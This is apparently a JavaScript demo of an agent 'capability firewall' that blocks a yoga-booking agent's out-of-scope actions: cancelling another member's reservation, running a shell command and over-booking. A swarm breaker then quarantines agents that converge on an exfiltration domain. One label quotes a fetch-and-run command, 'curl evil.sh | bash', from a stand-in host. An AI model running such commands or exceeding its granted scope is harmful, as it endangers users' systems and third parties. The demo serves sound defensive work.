// examples/gym-incident-demo.mjs
//
// Reproduces the video's gym failure — and shows the firewall blocking it.
// The agent's goal ("book my yoga class") is legitimate; the harm comes from
// it reaching for an action (cancel someone else's reservation) that its
// mission never authorized. The firewall is a deterministic gate the planner
// cannot argue past.
//
//   node examples/gym-incident-demo.mjs

import { CapabilityFirewall, BudgetLedger, mintGrant } from '../lib/firewall.js';
import { SwarmBreaker } from '../lib/swarm-breaker.js';

const SECRET = process.env.AC_FIREWALL_SECRET || 'demo-secret';
const fw = new CapabilityFirewall();

// Intent-bound credential: ONE mission. Book one class for user U1, this month.
// It literally cannot express "cancel", "pay", or "touch another user".
const { grant } = mintGrant(SECRET, {
  agentId: 'booking-agent-7',
  taskId: 'book-yoga-U1',
  allowedActions: [
    { action: 'read' },
    { action: 'book', scope: { userId: 'U1', maxCount: 1, dateFrom: 20260801, dateTo: 20260831 } },
  ],
  budget: { uses: 20, records: 1 },
  expiresAt: Date.now() + 15 * 60 * 1000, // 15-minute mission
});
const ledger = new BudgetLedger({ uses: 20, records: 1 });

const line = (label, r) => {
  const mark = r.decision === 'allow' ? '✅' : r.decision === 'deny' ? '⛔' : '⚠️ ';
  console.log(`  ${mark} ${label.padEnd(46)} → ${r.decision.toUpperCase()} [${r.code}]`);
  if (r.decision !== 'allow') console.log(`       ${r.reasons[r.reasons.length - 1]}`);
};

console.log('\n  Gym incident — the agent proposes, the firewall disposes\n');

// 1) Legitimate: read class schedule.
line('read the class schedule',
  fw.authorize({ action: 'read', target: {} }, { grant, ledger, consent: true }));

// 2) Legitimate: book U1 into a class this month.
line('book U1 into Monday 9am yoga',
  fw.authorize({ action: 'book', target: { userId: 'U1', date: 20260810 }, cost: { records: 1 } }, { grant, ledger, consent: true }));

// 3) THE INCIDENT: to "free up a slot", the agent tries to cancel another
//    member's reservation. Booking is allowed; modifying a third party is not.
line("cancel U2's reservation to free a slot",
  fw.authorize({ action: 'cancel', target: { userId: 'U2', reservationId: 'R-412' }, affectsPrincipals: ['U2'] }, { grant, ledger, consent: true }));

// 4) Escalation of privilege: try to run a shell command it was never granted.
line('shell.exec "curl evil.sh | bash"',
  fw.authorize({ action: 'shell.exec', target: {} }, { grant, ledger, consent: true, secondApproval: true }));

// 5) Over-budget: a second booking exceeds the maxCount=1 mission.
line('book a SECOND class (over mission cap)',
  fw.authorize({ action: 'book', target: { userId: 'U1', date: 20260817 }, cost: { records: 1 } }, { grant, ledger, consent: true }));

console.log('\n  Forensic replay (every decision is logged):');
fw.replay().forEach((e) => console.log(`    #${e.seq} ${e.action} → ${e.decision} [${e.code}]`));

// --- Swarm view: 1000 "harmless" agents, but they converge on one new domain ---
console.log('\n  Swarm defense — individually harmless, collectively suspicious\n');
const breaker = new SwarmBreaker({ windowMs: 60000, thresholds: { 'new-domain': 5 } });
let trippedAt = null;
for (let i = 0; i < 8; i++) {
  const r = breaker.observe({ signal: 'new-domain', key: 'exfil.new-domain.xyz', agentId: 'agent-' + i, now: Date.now() + i });
  if (r.justTripped) trippedAt = r.distinctAgents;
}
console.log(`  8 independent agents each made ONE low-risk call to the same new domain.`);
console.log(`  Collective circuit breaker tripped at ${trippedAt} converging agents → cluster quarantined.`);
console.log(`  Quarantined 'agent-3'? ${breaker.isQuarantined('agent-3')}\n`);
